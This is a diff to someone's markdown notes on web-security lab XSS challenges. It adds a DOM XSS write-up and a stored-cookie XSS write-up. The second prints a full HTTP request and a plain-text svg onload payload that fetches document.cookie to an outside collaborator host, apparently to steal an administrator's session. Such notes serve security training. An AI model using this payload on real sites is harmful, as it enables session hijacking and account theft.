@@ -1,4 +1,4 @@
-# Challenges
+# Various Encounters with XSS
 
 # DOM XSS in ```document.write``` sink using source ```location.search```
 ## Observations
@@ -559,4 +559,34 @@ The value is in the element.innerHTML:
 String.replace only hits once. 
 ```
 return html.replace('<', '&lt;').replace('>', '&gt;');
+```
+# DOM XSS in jQuery anchor href attribute sink using location.search source
+## Observations
+In page body: 
+```
+<script>
+    $(function() {
+        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+    });
+</script>
+```
+
+Used DOM invader to inject canary into URL param and opened it in a new tab - https://0a8500910332b81c8136301a009d00d8.web-security-academy.net/feedback?returnPath=uf38wv08
+
+Used dom invader's Exploit function to solve. 
+
+# Difficult to find Stored XSS in Cookie
+Delete user
+## Observations
+- The cookie had a username prepended to the session cookie value. 
+- By doing a targeted scan of the selected insertion point of "session=wiener" I was able to find the XSS. 
+- From there, crafted an XSS payload that would trigger a server error which, when stored, is viewed by the Administrator to steal their cookies. 
+```
+GET /my-account?id=wiener HTTP/2
+Host: 0af1006e038e647180be58cb000f00b0.web-security-academy.net
+Cookie: session='"><svg/onload%3dfetch(`//9isaatt2k90ql266z8zy89mfs6yxmzao.oastify.com/${encodeURIComponent(document.cookie)}`)>%3aEJh989nkd7SdvJWKBx5LZpPK8gqeEL5Y; session='"><svg/onload%3dfetch(`//9isaatt2k90ql266z8zy89mfs6yxmzao.oastify.com/${encodeURIComponent(document.cookie)}`)>%3aonMhHFh71wmQgSHOnPKWQJXxmmkqydOY
+```
+Plain-text payload:
+```
+'"><svg/onload=fetch(`//URL/${encodeURIComponent(document.cookie)}`)>
 ```
